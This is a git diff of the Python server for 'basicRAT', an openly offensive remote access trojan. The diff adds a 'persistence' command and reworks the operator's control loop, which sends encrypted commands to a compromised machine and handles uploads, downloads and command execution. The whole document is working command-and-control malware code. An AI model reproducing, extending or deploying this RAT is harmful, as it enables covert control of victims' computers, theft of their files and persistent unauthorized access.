@@ -1,6 +1,11 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+#
+# basicRAT server
+# https://github.com/vesche/basicRAT
+#
+
 import argparse
 import readline
 import socket
@@ -23,6 +28,7 @@ BANNER = '''
 HELP_TEXT = '''
 download <file> - Download a file.
 help            - Show this help menu.
+persistence     - Apply persistence mechanism.
 run <command>   - Execute a command on the target.
 upload <file>   - Upload a file.
 quit            - Gracefully kill client and server.
@@ -65,34 +71,30 @@ def main():
     print 'basicRAT server listening on port {}...\n'.format(port)
 
     s.listen(10)
-    conn, _ = s.accept()
+    conn, addr = s.accept()
 
     while True:
-        prompt = raw_input('basicRAT> ').rstrip().split()
+        prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()
 
         # allow noop
-        if prompt == []:
+        if not prompt:
             continue
 
         # seperate prompt into command and action
-        cmd, action = prompt[0], ' '.join(prompt[1:])
+        cmd, _, action = prompt.partition(' ')
 
-        # allow no action
-        if action == []:
-            action = ''
+        # display help text
+        if cmd == 'help':
+            print HELP_TEXT
+            continue
 
         # send data to client
-        data = '{} {}'.format(cmd, action).rstrip()
-        conn.send(encrypt(data))
+        conn.send(encrypt(prompt))
 
         # stop server
         if cmd == 'quit':
             s.close()
             sys.exit(0)
-
-        # display help text
-        elif cmd == 'help':
-            print HELP_TEXT
 
         # results of command
         elif cmd == 'run':
@@ -109,6 +111,15 @@ def main():
                     if not recv_data:
                         break
                     f.write(decrypt(recv_data))
+
+        # results of persistence
+        elif cmd == 'persistence':
+            print 'Applying persistence mechanism...'
+            recv_data = conn.recv(1024)
+            print decrypt(recv_data)
+
+        else:
+            print 'Invalid command.'
 
 
 if __name__ == '__main__':
